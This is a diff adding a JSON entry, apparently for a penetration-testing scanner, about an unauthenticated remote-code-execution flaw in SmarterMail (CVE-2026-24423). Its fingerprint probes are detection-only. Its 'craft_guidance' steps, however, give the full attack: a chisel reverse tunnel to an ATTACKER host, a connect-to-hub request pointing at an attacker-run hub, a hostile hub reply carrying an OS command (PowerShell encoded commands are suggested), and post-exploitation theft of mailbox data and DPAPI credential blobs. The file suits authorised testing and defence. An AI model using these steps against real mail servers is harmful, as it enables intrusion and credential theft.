@@ -1,0 +1,61 @@
+{
+  "category": "smartermail",
+  "description": "SmarterTools SmarterMail — CVE-2026-24423 unauthenticated remote code execution via the sysadmin connect-to-hub flow (SSRF-to-hostile-hub -> SystemMount.CommandMount blindly executed). Affects builds prior to 9511. Detection-only endpoint/product fingerprints; the hostile-hub weaponisation is operator-supervised (Rule 5 / manual_chain).",
+  "craft_guidance": [
+    "1. SmarterMail commonly listens on 17017 (web UI) and 9998; in hardened installs it is bound to 127.0.0.1 only. If you already have a foothold, pivot: `chisel client ATTACKER:9001 R:17017:127.0.0.1:17017` (server side `chisel server -p 9001 --reverse`), then test http://127.0.0.1:17017 locally through Burp.",
+    "2. FINGERPRINT: Server header `SmarterMail`, /interface/root, /api/v1/ SwaggerUI, login body markers 'SmarterMail'/'SmarterTools'. Grab the build number (Help/About or /api/v1/settings/sysadmin/product-info) — CVE-2026-24423 is fixed in 9511; earlier builds are vulnerable.",
+    "3. CVE-2026-24423 unauth RCE lives at POST /api/v1/settings/sysadmin/connect-to-hub. Body: {\"hubAddress\":\"http://ATTACKER:8081/\",\"oneTimePassword\":\"test\",\"nodeName\":\"victim\"}. The server makes an unauthenticated outbound call to hubAddress (this is the SSRF primitive).",
+    "4. OOB CONFIRMATION (Rule 9a — benign, no code exec): set hubAddress to your Collaborator/callback URL (generate_collaborator_payload) and POST. An inbound HTTP/DNS hit proves the server fetches attacker-controlled hubAddress unauthenticated — the CVE-2026-24423 precondition. This is the safe detection step; do NOT ship a CommandMount payload during detection.",
+    "5. WEAPONISATION (operator-supervised): the hostile hub answers the node-management handshake (POST /web/api/node-management/setup-initial-connection) with a JSON body whose SystemMount.CommandMount holds an OS command; SmarterMail executes it as the service account (svc_mail). Use a base64 -EncodedCommand (UTF-16LE) for a PowerShell one-liner. Confirm with a benign marker first (`powershell -c \"$env:USERNAME\"`), not a reverse shell, unless RoE permits foothold.",
+    "6. POST-RCE: svc_mail can read the SmarterMail data tree — C:\\SmarterMail\\Domains\\<domain>\\Users (and .bak backups) enumerate mailbox owners; user profiles under C:\\Users\\<u>\\AppData\\Roaming\\Microsoft hold DPAPI masterkeys + credential blobs. Pivot to the network lane: record_loot the DPAPI artifacts, then impacket-dpapi (see playbook-red-team-web / redteam_tool_guide)."
+  ],
+  "contexts": {
+    "smartermail_connect_to_hub_rce_2026": {
+      "description": "CVE-2026-24423 — SmarterMail sysadmin connect-to-hub unauthenticated RCE. The endpoint issues an unauthenticated outbound request to a caller-supplied hubAddress; a hostile hub returns SystemMount.CommandMount which SmarterMail executes as svc_mail. Detection = confirm the connect-to-hub endpoint + SmarterMail product family are reachable; the CommandMount payload is operator-supervised (manual_chain).",
+      "tech_match": ["smartermail", "smartertools", "server: smartermail"],
+      "param_match": ["hubAddress", "oneTimePassword", "nodeName"],
+      "probes": [
+        {
+          "payload": "/api/v1/settings/sysadmin/connect-to-hub",
+          "description": "connect-to-hub endpoint present (SmarterMail JSON envelope on the sysadmin API) confirms the CVE-2026-24423 attack surface is exposed pre-auth. Fingerprint only — no hubAddress/CommandMount sent. Run the OOB confirmation from craft_guidance step 4 to prove the SSRF, then escalate operator-supervised.",
+          "matchers": [
+            {"type": "status", "status": [200, 400, 401, 405, 500]},
+            {"type": "word", "words": ["hubAddress", "oneTimePassword", "SmarterMail", "connect-to-hub", "nodeName", "SystemMount"], "in": "body", "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"path_override": true, "manual_chain": true}
+        }
+      ]
+    },
+    "smartermail_product_fingerprint": {
+      "description": "SmarterMail web UI / REST fingerprint — confirms the affected product family and, via the build number, whether it predates the 9511 CVE-2026-24423 fix.",
+      "tech_match": ["smartermail", "smartertools"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/interface/root",
+          "description": "SmarterMail web client root present (SmarterMail/SmarterTools markers) — affected product confirmed.",
+          "matchers": [
+            {"type": "status", "status": [200, 301, 302]},
+            {"type": "word", "words": ["SmarterMail", "SmarterTools"], "in": "body", "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"path_override": true}
+        },
+        {
+          "payload": "/api/v1/settings/sysadmin/product-info",
+          "description": "SmarterMail sysadmin product-info endpoint — exposes the build/version used to confirm CVE-2026-24423 applicability (< 9511).",
+          "matchers": [
+            {"type": "status", "status": [200, 401]},
+            {"type": "word", "words": ["version", "SmarterMail", "build", "licenseLevel"], "in": "body", "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"path_override": true, "manual_chain": true}
+        }
+      ]
+    }
+  }
+}
